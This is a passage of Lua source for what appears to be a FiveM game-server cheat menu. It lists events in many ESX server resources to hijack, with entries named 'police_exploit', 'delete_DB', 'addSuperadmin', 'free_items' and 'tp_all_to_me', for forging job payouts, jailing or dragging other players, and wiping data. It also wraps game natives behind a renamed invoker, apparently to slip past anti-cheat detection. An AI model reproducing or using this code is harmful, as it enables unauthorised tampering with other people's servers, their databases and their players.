           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'MethField\' then",
               name = 'drugs:methfield',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'MethProcessing\' then",
               name = 'drugs:methprocess',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'MethDealer\' then",
               name = 'drugs:methsell',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'WeedField\' then",
               name = 'drugs:weedfield',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'WeedProcessing\' then",
               name = 'drugs:weedprocess',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'WeedDealer\' then",
               name = 'drugs:weedsell',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'OpiumField\' then",
               name = 'drugs:opiumfield',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'OpiumProcessing\' then",
               name = 'drugs:opiumprocess',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'OpiumDealer\' then",
               name = 'drugs:opiumsell',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/coke.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "CurrentAction = nil",
               name = 'drugs:stop_feild_coke',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "estCoke",
               name = 'drugs:stop_process_coke',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "sformCoke",
               name = 'drugs:stop_sell_coke',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "stopSell",
               name = 'drugs:stop_feild_meth',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "tMeth",
               name = 'drugs:stop_process_meth',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "sformMeth",
               name = 'drugs:stop_sell_meth',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "stopSellM",
               name = 'drugs:stop_feild_weed',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "vestWeed",
               name = 'drugs:stop_feild_weed',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "ransformWeed",
               name = 'drugs:stop_sell_weed',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "stopSellW",
               name = 'drugs:stop_feild_opium',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "stopHarvest",
               name = 'drugs:stop_process_opium',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "formOpium",
               name = 'drugs:stop_sell_opium',
               noparam = false,
           },
           {
               resource = "esx_taxijob",
               resourcelooklike = 'esx_taxijob',
               file = {'client/main.lua'},
               lookfor = "success'%)",
               name = 'esx_taxijob:success',
               noparam = false,
           },
           
           {
               resource = "esx_pizza",
               resourcelooklike = 'esx_pizza',
               file = {'client/main.lua'},
               lookfor = ", amount%)",
               name = 'esx_pizza:pay',
               noparam = false,
           },
               {
               resource = "gcphone",
               file = {"client/twitter.lua"},
               resourcelooklike = {"phone"},
               lookfor = ", data.username or '', data.password or '', data.message",
               name = "gcphone_posttweet",
               noparam = false,
               },
           
               {
               resource = "gcphone",
               file = {"client/twitter.lua"},
               resourcelooklike = {"phone"},
               lookfor = ", data.username, data.password, data.avatarUrl",
               name = "gcphone_createtwiteracc",
               noparam = false,
               },
               
               {
               resource = "gcphone",
               file = {"client/twitter.lua"},
               resourcelooklike = {"phone"},
               lookfor = ", data.username, data.password",
               name = "gcphone_logintwitteracc",
               noparam = false,
               },
           
               {
               resource = "esx_vehicleshop",
               resourcelooklike = {"vehicle"},
               file = {"client/main.lua"},
               lookfor = ", vehicleProps",
               name = "add_vehicle",
               noparam = false,
               },
           
               {
               resource = "esx_policejob",
               resourcelooklike = {"police"},
               file = {"client/main.lua"},
               lookfor = ", GetPlayerServerId%b(),",
               name = "police_exploit",
               noparam = false,
               },
           
               {
               resource = "CarryPeople",
               resourcelooklike = {"carry"},
               file = {"cl_carry.lua"},
               lookfor = ",targetSrc%)",
               name = "carry_exploit",
               noparam = false,
               },
               
               {
                   resource = "CarryPeople",
                   resourcelooklike = {"carry"},
                   file = {"cl_carry.lua"},
                   lookfor = "",
                   name = "carry_exploitv2",
                   noparam = false,
                   },
               
               {
               resource = "CarryPeople",
               resourcelooklike = {"carry"},
               file = {"cl_carry.lua"},
               lookfor = ",target",
               name = "carrypeople_stop",
               noparam = false,
               },
           
               {
               resource = "esx-qalle-jail",
               resourcelooklike = {"jail"},
               file = {"client/client.lua"},
               lookfor = ", function%(newJailTime%)",
               name = "qalle_jailer",
               noparam = false,
               },
               {
               resource = "esx_jailer",
               resourcelooklike = {"jail"},
               file = {"client/main.lua"},
               lookfor = "",
               name = "esx_jailer:sendToJail",
               noparam = false,
               },
               {
               resource = "esx_policejob",
               resourcelooklike = {"police"},
               file = {"client/main.lua"},
               lookfor = ", player, c",
               name = "community",
               noparam = false,
               },
           
               {
               resource = "esx_truckerjob",
               resourcelooklike = {"trucker"},
               file = {"client/main.lua"},
               lookfor = ", amount",
               name = "truckerjob_pay",
               noparam = false,
               },
           
               {
               resource = "gopostal_job",
               resourcelooklike = {"gopostal"},
               file = {"client/cl.lua"},
               lookfor = ", currentJobPay",
               name = "gopostal_pay",
               noparam = false,
               },
               
               {
               resource = "esx-qalle-jail",
               resourcelooklike = {"jail"},
               file = {"client/client.lua"},
               lookfor = ", jailTime%)",
               name = "qalle_unjail",
               noparam = false,
               },
   
               {
               resource = "esx_holdup",
               resourcelooklike = {"esx_holdup", "holdup"},
               file = {"client/main.lua", "client.lua"},
               lookfor = ", function%(award%)",
               name = "esx_holdup",
               noparam = false,
               },
   
               {
               resource = "esx_carwash",
               resourcelooklike = {"esx_holdup", "holdup"},
               file = {"client/main.lua", "client.lua"},
               lookfor = ", function%(price%)",
               name = "esx_carwash:success",
               noparam = false,
               },
   
               --[[{
                   resource = "",
                   resourcelooklike = {"", ""},
                   file = {"", ""},
                   lookfor = "",
                   name = "fuck_economy",
                   noparam = false,
               },]]
   
               
   
               {
               resource = "esx_policejob",
               resourcelooklike = {"police"},
               file = {"client/main.lua"},
               lookfor = ", GetPlayerServerId%b(), \'society_police\', _U%b(), data.current.amount",
               name = "send_bill",
               noparam = false,
               },
               {
               resource = "ESX_CommunityService",
               resourcelooklike = {"CommunityService"},
               file = {"client/main.lua"},
               lookfor = ", function%(source%)",
               name = "communityservice_finishservice",
               noparam = false,
               },
               
               {
               resource = "esx_garbagejob",
               resourcelooklike = {"garbage"},
               file = {"client/main.lua"},
               lookfor = ", amount%)",
               name = "garbagejob_pay",
               noparam = false,
               },
           
               {
               resource = "TakeHostage",
               resourcelooklike = {"hostage"},
               file = {"cl_takehostage.lua"},
               lookfor = ", closestPlayer,",
               name = "Hostage_Exploit",
               noparam = false,
               },
           
               {
               resource = "esx_moneywash",
               resourcelooklike = {"wash"},
               file = {"client/main.lua"},
               lookfor = ", amount, zone",
               name = "Money_Wash",
               noparam = false,
               },
   
               {
               resource = "esx_fishing",
               resourcelooklike = {"esx_fishing", "esx_Advancedfishing"},
               file = {"client/main.lua"},
               lookfor = ", bait%)",
               name = "fishing:catch",
               noparam = false,
               },
   
   
               {
               resource = "esx_fishing",
               resourcelooklike = {"esx_fishing", "esx_Advancedfishing"},
               file = {"client/main.lua"},
               lookfor = ', "shark"%)',
               name = "fishing:startSelling",
               noparam = false,
               },
           
           
               {
               resource = "esx_kashacters",
               resourcelooklike = {"kashacters"},
               file = {"client/main.lua"},
               lookfor = ", data.charid%)",
               name = "delete_DB",
               noparam = false
               },
   
               {
               resource = "esx_kashacters",
               resourcelooklike = {"kashacters"},
               file = {"client/main.lua"},
               lookfor = ", data.charid%)",
               name = "addSuperadmin",
               noparam = false
               },
           
               {
               resource = "esx_bus",
               resourcelooklike = {"bus"},
               file = {"client/main.lua"},
               lookfor = ", amount%)",
               name = "buss_pay",
               noparam = false
               },
           
               {
               resource = "99kr-burglary",
               resourcelooklike = {"burglary"},
               file = {"burglary_client.lua"},
               lookfor = ", values.item, rndm%)",
               name = "free_items",
               noparam = false
               },
           
               {
               resource = "es_extended",
               resourcelooklike = {"extended"},
               file = {"client/common.lua"},
               lookfor = ", function%(cb%)",
               name = "esx_hook",
               noparam = false
               },
           
               {
               resource = "Badger_Tackle",
               resourcelooklike = {"tackle"},
               file = {"client/main.lua"},
               lookfor = ", GetPlayerServerId%(closestPlayer%)",
               name = "tp_all_to_me",
               noparam = false
               },
           
               {
               resource = "dp-emotes",
               resourcelooklike = {"emotes", "emote", "dpemotes"},
               file = {"client/Syncing.lua"},
               lookfor = ", GetPlayerServerId%(target%), requestedemote, otheremote",
               name = "emote_dp",
               noparam = false
               },
           
               {
               resource = "rl-inventory",
               resourcelooklike = {"inventory"},
               file = {"client/main.lua"},
               lookfor = ', \"trunk\", CurrentVehicle, other',
               name = "open_inv",
               noparam = false
               },
           
               {
               resource = "esx_hifi",
               resourcelooklike = {"hifi", "esx-hifi", "esx-sound", "esx_sound", "sound"},
               file = {"client/main.lua", "client.lua"},
               lookfor = ', data.value, coords',
               name = "play_song",
               noparam = false
               },
           }
   }
   
   
   local Fatasf = {
       n = {
           _RNE_ = RegisterNetEvent,
           _AEH_ = AddEventHandler,
           _TSE_ = TriggerServerEvent,
           CreateAnDui = function(url, w, h) return CockT.Inv["Invoke"](CockT.Natives['CreateDui'], CockT.Strings.tostring(url), w, h, _cit_.ReturnResultAnyway(), _cit_.ResultAsLong())  end,
           DestroyDui = function(dui) return CockT.Inv["Invoke"](CockT.Natives['DestroyDui'], dui) end,
           IsPedSittingInVehicle = function(player, vehicle) return CockT.Inv["Invoke"](CockT.Natives['IsPedSittingInVehicle'], player, vehicle) end,
           UseParticleFxAsset = function(name)  return CockT.Inv["Invoke"](CockT.Natives['UseParticleFxAsset'], name, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           StartNetworkedParticleFxNonLoopedAtCoord = function(effect, x, y, z, xr, yr, zr, scale, xAxis, yAxis, zAxis)  return CockT.Inv["Invoke"](CockT.Natives['StartNetworkedParticleFxNonLoopedAtCoord'], effect, x, y, z, xr, yr, zr, scale, xAxis, yAxis, zAxis, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           SetTextColour = function(r, g, b, a) return CockT.Inv["Invoke"](CockT.Natives['SetTextColour'], r, g, b, a, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           RequestNamedPtfxAsset = function(fxName) return CockT.Inv["Invoke"](CockT.Natives['RequestNamedPtfxAsset'], fxName, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           GetEntityCoords = function(entity) return CockT.Inv["Invoke"](CockT.Natives['GetEntityCoords'], entity, _cit_.ResultAsVector()) end,
           CreateVehicle = function(veh, x, y, z, heading, isNetwork, netMissionEntity) return CockT.Inv["Invoke"](CockT.Natives['CreateVehicle'], veh, x, y, z, heading, isNetwork, netMissionEntity, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GetDistanceBetweenCoords = function(x1, y1, z1, x2, y2, z2, useZ) return CockT.Inv["Invoke"](CockT.Natives['GetDistanceBetweenCoords'], x1, y1, z1, x2, y2, z2, useZ, _cit_.ReturnResultAnyway(), _cit_.ResultAsFloat()) end,
           GetEntityRotation = function(entity, rotationOrder) return CockT.Inv["Invoke"](CockT.Natives['GetEntityRotation'], entity, rotationOrder, _cit_.ResultAsVector()) end,
           GetScreenCoordFromWorldCoord = function(worldX, worldY, worldZ) return CockT.Inv["Invoke"](CockT.Natives['GetScreenCoordFromWorldCoord'], worldX, worldY, worldZ, _cit_.PointerValueFloat(), _cit_.PointerValueFloat(), _cit_.ReturnResultAnyway()) end,
           GetActiveScreenResolution = function() return CockT.Inv["Invoke"](CockT.Natives['GetActiveScreenResolution'], _cit_.PointerValueInt(), _cit_.PointerValueInt()) end,
           GetPedBoneCoords = function(ped, boneId, offsetX, offsetY, offsetZ) return CockT.Inv["Invoke"](CockT.Natives['GetPedBoneCoords'], ped, boneId, offsetX, offsetY, offsetZ, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           HasEntityClearLosToEntity = function(entity1, entity2, traceType) return CockT.Inv["Invoke"](CockT.Natives['HasEntityClearLosToEntity'], entity1, entity2, traceType, _cit_.ReturnResultAnyway()) end,
           DrawLine = function(x1, y1, z1, x2, y2, z2, r, g, b, a) return CockT.Inv["Invoke"](CockT.Natives['DrawLine'], x1, y1, z1, x2, y2, z2, r, g, b, a) end,
           GetActivePlayers = function() return CockT.Strings.msgunpack(CockT.Inv["Invoke"](CockT.Natives['GetActivePlayers'], _cit_.ResultAsObject())) end,
           GetPedBoneIndex = function(ped, boneId) return CockT.Inv["Invoke"](CockT.Natives['GetPedBoneIndex'], ped, boneId, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetEntityVisible = function(entity, toggle, unk) return CockT.Inv["Invoke"](CockT.Natives['SetEntityVisible'], entity, toggle, unk) end,
           AttachEntityToEntity = function(entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot) return CockT.Inv["Invoke"](CockT.Natives['AttachEntityToEntity'], entity1, entity2, boneIndex, xPos, yPos, zPos, xRot, yRot, zRot, p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot) end,
           DeleteEntity = function(entity) return CockT.Inv["Invoke"](CockT.Natives['DeleteEntity'], _cit_.PointerValueIntInitialized(entity)) end,
           DeleteObject = function(entity) return CockT.Inv["Invoke"](CockT.Natives['DeleteObject'], _cit_.PointerValueIntInitialized(entity)) end,
           DeletePed = function(entity) return CockT.Inv["Invoke"](CockT.Natives['DeletePed'], _cit_.PointerValueIntInitialized(entity)) end,
           DeleteVehicle = function(entity) return CockT.Inv["Invoke"](CockT.Natives['DeletePed'], _cit_.PointerValueIntInitialized(entity)) end,
           CreateObject = function(modelHash, x, y, z, isNetwork, thisScriptCheck, dynamic) return CockT.Inv["Invoke"](CockT.Natives['CreateObject'], modelHash, x, y, z, isNetwork, thisScriptCheck, dynamic, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           --GetPlayerPed = function(PlayerId) return GetPlayerPed(PlayerId) end,
           GetPlayerPed = function(PlayerId) return CockT.Inv["Invoke"](CockT.Natives['GetPlayerPed'], PlayerId, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           PlayerId = function() return CockT.Inv["Invoke"](CockT.Natives['PlayerId'], _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           PlayerPedId = function() return CockT.Inv["Invoke"](CockT.Natives['PlayerPedId'], _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           DoesCamExist = function(cam)  return CockT.Inv["Invoke"](CockT.Natives['DoesCamExist'], cam, _cit_.ReturnResultAnyway())  end,
           GetVehiclePedIsIn = function(ped, lastVehicle) return CockT.Inv["Invoke"](CockT.Natives['GetVehiclePedIsIn'], ped, lastVehicle, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GetPedInVehicleSeat = function(vehicle, index) return CockT.Inv["Invoke"](CockT.Natives['GetPedInVehicleSeat'], vehicle, index, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           TriggerServerEventInternal = function(eventName, eventPayload, payloadLength) return CockT.Inv["Invoke"](CockT.Natives['TriggerServerEventInternal'], CockT.Strings.tostring(eventName), CockT.Strings.tostring(eventPayload), payloadLength) end,
           TriggerEventInternal = function(eventName, eventPayload, payloadLength) return CockT.Inv["Invoke"](CockT.Natives['TriggerEventInternal'], CockT.Strings.tostring(eventName), CockT.Strings.tostring(eventPayload), payloadLength) end,
           ShootSingleBulletBetweenCoords = function(x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed) return CockT.Inv["Invoke"](CockT.Natives['ShootSingleBulletBetweenCoords'], x1, y1, z1, x2, y2, z2, damage, p7, weaponHash, ownerPed, isAudible, isInvisible, speed) end,
           RequestModel = function(model) return CockT.Inv["Invoke"](CockT.Natives['RequestModel'], model) end,
           GetHashKey = function(hash) return CockT.Inv["Invoke"](CockT.Natives['GetHashKey'], CockT.Strings.tostring(hash), _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetPedComponentVariation = function(ped, componentId, drawableId, textureId, paletteId) return CockT.Inv["Invoke"](CockT.Natives['SetPedComponentVariation'], ped, componentId, drawableId, textureId, paletteId)  end,
           CreatePed = function(pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck) return CockT.Inv["Invoke"](CockT.Natives['CreatePed'], pedType, modelHash, x, y, z, heading, isNetwork, thisScriptCheck, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetVehicleColours = function(vehicle, colorPrimary, colorSecondary) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleColours'], vehicle, colorPrimary, colorSecondary) end,
           SetVehicleNumberPlateText = function(vehicle, plateText) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleNumberPlateText'], vehicle, CockT.Strings.tostring(plateText)) end,
           SetEntityVelocity = function(entity, x, y, z) return CockT.Inv["Invoke"](CockT.Natives['SetEntityVelocity'], entity, x, y, z) end,
           SetTextJustification = function(justifyType) return CockT.Inv["Invoke"](CockT.Natives['SetTextJustification'], justifyType) end,
           GetCamCoord = function(cam) return CockT.Inv["Invoke"](CockT.Natives['GetCamCoord'], cam, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           GetCamRot = function(cam, rotationOrder) return CockT.Inv["Invoke"](CockT.Natives['GetCamRot'], cam, rotationOrder, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           CreateCam = function(camName, p1) return CockT.Inv["Invoke"](CockT.Natives['CreateCam'], CockT.Strings.tostring(camName), p1, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           CreateRuntimeTxd = function(name) return CockT.Inv["Invoke"](CockT.Natives['CreateRuntimeTxd'], CockT.Strings.tostring(name), _cit_.ReturnResultAnyway(), _cit_.ResultAsLong()) end,
           GetDuiHandle = function(duiObject) return CockT.Inv["Invoke"](CockT.Natives['GetDuiHandle'], duiObject, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           CreateRuntimeTextureFromDuiHandle = function(txd, txn, duiHandle) return CockT.Inv["Invoke"](CockT.Natives['CreateRuntimeTextureFromDuiHandle'], txd, txn, duiHandle, _cit_.ReturnResultAnyway(), _cit_.ResultAsLong()) end,
           --[[GetResourceState = function(resourceName) 
               return CockT.Inv["Invoke"](CockT.Natives['GetResourceState'], CockT.Strings.tostring(resourceName), _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) 
           end,]]
           GetResourceState = function(resourceName) 
               return GetResourceState(CockT.Strings.tostring(resourceName), _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) 
           end,
           GetNumVehicleMods = function(vehicle, modType) return CockT.Inv["Invoke"](CockT.Natives['GetNumVehicleMods'], vehicle, modType, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           GiveDelayedWeaponToPed = function(ped, weaponHash, ammoCount, bForceInHand) return CockT.Inv["Invoke"](CockT.Natives['GiveDelayedWeaponToPed'], ped, weaponHash, ammoCount, bForceInHand) end,
           TaskVehicleDriveToCoord = function(ped, vehicle, x, y, z, speed, p6, vehicleModel, drivingMode, stopRange, p10) return CockT.Inv["Invoke"](CockT.Natives['TaskVehicleDriveToCoord'], ped, vehicle, x, y, z, speed, p6, vehicleModel, drivingMode, stopRange, p10) end,
           SetDriveTaskDrivingStyle = function(ped, drivingStyle) return CockT.Inv["Invoke"](CockT.Natives['SetDriveTaskDrivingStyle'], ped, drivingStyle) end,
           NetworkRequestControlOfEntity = function(entity) return CockT.Inv["Invoke"](CockT.Natives['NetworkRequestControlOfEntity'], entity, _cit_.ReturnResultAnyway()) end,
           GetBlipInfoIdCoord = function(blip) return CockT.Inv["Invoke"](CockT.Natives['GetBlipInfoIdCoord'], blip, _cit_.ReturnResultAnyway(), _cit_.ResultAsVector()) end,
           DoesEntityExist = function(entity) return CockT.Inv["Invoke"](CockT.Natives['DoesEntityExist'], entity, _cit_.ReturnResultAnyway()) end,
           GetVehiclePedIsUsing = function(ped) return CockT.Inv["Invoke"](CockT.Natives['GetVehiclePedIsUsing'], ped, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           ClearPedSecondaryTask = function(ped) return CockT.Inv["Invoke"](CockT.Natives['ClearPedSecondaryTask'], ped) end,
           SetEntityMaxSpeed = function(entity, speed) return CockT.Inv["Invoke"](CockT.Natives['SetEntityMaxSpeed'], entity, speed) end,
           GetNuiCursorPosition = function() return CockT.Inv["Invoke"](CockT.Natives['GetNuiCursorPosition'], _cit_.PointerValueInt(), _cit_.PointerValueInt()) end,
           DrawSprite = function(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)  return CockT.Inv["Invoke"](CockT.Natives['DrawSprite'], CockT.Strings.tostring(textureDict), CockT.Strings.tostring(textureName), screenX, screenY, width, height, heading, red, green, blue, alpha);  end,
           DrawRect = function(x, y, width, height, r, g, b, a)  return CockT.Inv["Invoke"](CockT.Natives['DrawRect'], x, y, width, height, r, g, b, a)  end,
           SetTextCentre = function(align) return CockT.Inv["Invoke"](CockT.Natives['SetTextCentre'], align) end,
           GetGroundZFor_3dCoord = function(x, y, z, unk) return CockT.Inv["Invoke"](CockT.Natives['GetGroundZFor_3dCoord'], x, y, z, _cit_.PointerValueFloat(), unk, _cit_.ReturnResultAnyway())end,
           GetEntityBoneIndexByName = function(entity, boneName) return CockT.Inv["Invoke"](CockT.Natives['GetEntityBoneIndexByName'], entity, boneName) end,
           SetVehicleOnGroundProperly = function(vehicle) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleOnGroundProperly'], vehicle, _cit_.ReturnResultAnyway()) end,
           SetVehicleModKit = function(vehicle, modKit) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleModKit'], vehicle, modKit) end,
           SetVehicleMod = function(vehicle, modType, modIndex, customTires) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleMod'], vehicle, modType, modIndex, customTires) end,
           ToggleVehicleMod = function(vehicle, modType, toggle) return CockT.Inv["Invoke"](CockT.Natives['ToggleVehicleMod'], vehicle, modType, toggle) end,
           TaskPlayAnim = function(ped, animDictionary, animationName, blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ) return CockT.Inv["Invoke"](CockT.Natives['TaskPlayAnim'], ped, CockT.Strings.tostring(animDictionary), CockT.Strings.tostring(animationName), blendInSpeed, blendOutSpeed, duration, flag, playbackRate, lockX, lockY, lockZ) end,
           ClearPedTasks = function(ped) return CockT.Inv["Invoke"](CockT.Natives['ClearPedTasks'], ped) end,
           RemoveWeaponFromPed = function(ped, weaponHash) return CockT.Inv["Invoke"](CockT.Natives['RemoveWeaponFromPed'], ped, weaponHash) end,
           GiveWeaponToPed = function(ped, weaponHash, ammoCount, isHidden, equipNow) return CockT.Inv["Invoke"](CockT.Natives['GiveWeaponToPed'], ped, weaponHash, ammoCount, isHidden, equipNow) end,
           PlaySoundFrontend = function(soundId, audioName, audioRef, p3) return CockT.Inv["Invoke"](CockT.Natives['PlaySoundFrontend'], soundId, CockT.Strings.tostring(audioName), CockT.Strings.tostring(audioRef), p3) end,
           PlaySound = function(soundId, audioName, audioRef, p3) return CockT.Inv["Invoke"](CockT.Natives['PlaySound'], soundId, CockT.Strings.tostring(audioName), CockT.Strings.tostring(audioRef), p3) end,
           GetSelectedPedWeapon = function(ped) return CockT.Inv["Invoke"](CockT.Natives['GetSelectedPedWeapon'], ped, _cit_.ReturnResultAnyway(), _cit_.ResultAsInteger()) end,
           SetPedAmmo = function(ped, weaponHash, ammo) return CockT.Inv["Invoke"](CockT.Natives['SetPedAmmo'], ped, weaponHash, ammo) end,
           SetVehicleWindowTint = function(vehicle, tint) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleWindowTint'], vehicle, tint) end,
           SetVehicleTyresCanBurst = function(vehicle, bool) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyresCanBurst'], vehicle, bool) end,
           SetVehicleNumberPlateTextIndex = function(vehicle, plateIndex) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleNumberPlateTextIndex'], vehicle, plateIndex) end,
           SetVehicleFixed = function(vehicle) return CockT.Inv["Invoke"](CockT.Natives['SetVehicleFixed'], vehicle) end,
           SetPedKeepTask = function(ped, bool) return CockT.Inv["Invoke"](CockT.Natives['SetPedKeepTask'], ped, bool) end,
           SetEntityInvincible = function(ped, bool) return CockT.Inv["Invoke"](CockT.Natives['SetEntityInvincible'], entity, toggle) end,
           IsEntityPlayingAnim = function(entity, animDict, animName, taskFlag) return CockT.Inv["Invoke"](CockT.Natives['IsEntityPlayingAnim'], entity, CockT.Strings.tostring(animDict), CockT.Strings.tostring(animName), taskFlag) end,
           FreezeEntityPosition = function(entity, toggle) return CockT.Inv["Invoke"](CockT.Natives['FreezeEntityPosition'], entity, toggle) end,
           SetExtraTimecycleModifier = function(modifierName) return CockT.Inv["Invoke"](CockT.Natives['SetExtraTimecycleModifier'], modifierName) end,
           ClearExtraTimecycleModifier = function() return CockT.Inv["Invoke"](CockT.Natives['ClearExtraTimecycleModifier']) end,
           ForceSocialClubUpdate = function() return CockT.Inv["Invoke"](CockT.Natives['ForceSocialClubUpdate']) end,
           RestartGame = function() return CockT.Inv["Invoke"](CockT.Natives['RestartGame']) end,
           DisableControlAction = function(padIndex, control, bool) return CockT.Inv["Invoke"](CockT.Natives['DisableControlAction'], padIndex, control, bool) end,
           GetPlayerName = function(player) return CockT.Inv["Invoke"](CockT.Natives['GetPlayerName'], player, _cit_.ResultAsString()) end,
           GetCurrentServerEndpoint = function() return CockT.Inv["Invoke"](CockT.Natives['GetCurrentServerEndpoint'], _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           IsPedDeadOrDying = function(ped, p1) return CockT.Inv["Invoke"](CockT.Natives['IsPedDeadOrDying'], ped, p1, _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
           GetCurrentResourceName = function() return CockT.Inv["Invoke"](CockT.Natives['GetCurrentResourceName'], _cit_.ReturnResultAnyway(), _cit_.ResultAsString()) end,
